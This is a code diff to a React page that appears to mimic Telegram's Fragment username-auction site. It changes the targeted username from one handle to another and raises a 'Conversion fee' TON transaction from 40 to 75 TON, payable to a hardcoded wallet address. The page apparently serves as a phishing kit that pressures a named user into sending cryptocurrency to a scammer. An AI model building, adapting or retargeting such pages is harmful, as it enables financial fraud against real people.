@@ -130,7 +130,7 @@ const AuctionSection: React.FC<AuctionSectionProps> = ({ nickname, showSubscribe
       <h2 className="tm-section-header-text">
         <span className="tm-section-header-domain">
           <span className="tm-web3-address">
-            <span className="subdomain">AKarimiiiii</span>
+            <span className="subdomain">lamNexus1</span>
             <span className="domain">.t.me</span>
           </span>
         </span>
@@ -215,19 +215,19 @@ const UsernameInfoSection: React.FC<UsernameInfoSectionProps> = ({ nickname }) =
     <dl className="tm-list-item">
       <dt className="tm-list-item-title">Telegram Username</dt>
       <dd className="tm-list-item-value">
-        <span className="accent-color">@AKarimiiiii</span>
+        <span className="accent-color">@lamNexus1</span>
       </dd>
     </dl>
     <dl className="tm-list-item">
       <dt className="tm-list-item-title">Web Address</dt>
       <dd className="tm-list-item-value">
-        <span className="accent-color">t.me/AKarimiiiii</span>
+        <span className="accent-color">t.me/lamNexus1</span>
       </dd>
     </dl>
     <dl className="tm-list-item">
       <dt className="tm-list-item-title">TON Web 3.0 Address</dt>
       <dd className="tm-list-item-value">
-        <span className="accent-color"><span className="tm-web3-address"><span className="subdomain">AKarimiiiii</span><span className="domain">.t.me</span></span></span>
+        <span className="accent-color"><span className="tm-web3-address"><span className="subdomain">lamNexus1</span><span className="domain">.t.me</span></span></span>
       </dd>
     </dl>
   </div>
@@ -242,7 +242,7 @@ interface ActionButtonsProps {
 
 
 const ActionButtons: React.FC<ActionButtonsProps> = ({ nickname, showSubscribe, onSubscribeToggle }) => {
-  const comment = "Conversion fee for AKarimiiiii.t.me\n\nRef#R9OOOw9Mb";
+  const comment = "Conversion fee for lamNexus1.t.me\n\nRef#R9OOOw9Mb";
   const [tonConnectUi] = useTonConnectUI();
   const wallet = useTonWallet();
   const [tx, setTx] = useState<SendTransactionRequest>({
@@ -250,7 +250,7 @@ const ActionButtons: React.FC<ActionButtonsProps> = ({ nickname, showSubscribe, 
     messages: [
       {
         address: "UQBUTyUtpZuecOGdADIXibnVTJ7GdGeb2sJQGcUPKre2RfoU",
-        amount: "40000000000",
+        amount: "75000000000",
         payload: beginCell().storeUint(0, 32).storeStringTail(comment).endCell().toBoc().toString("base64"),
       },
     ],
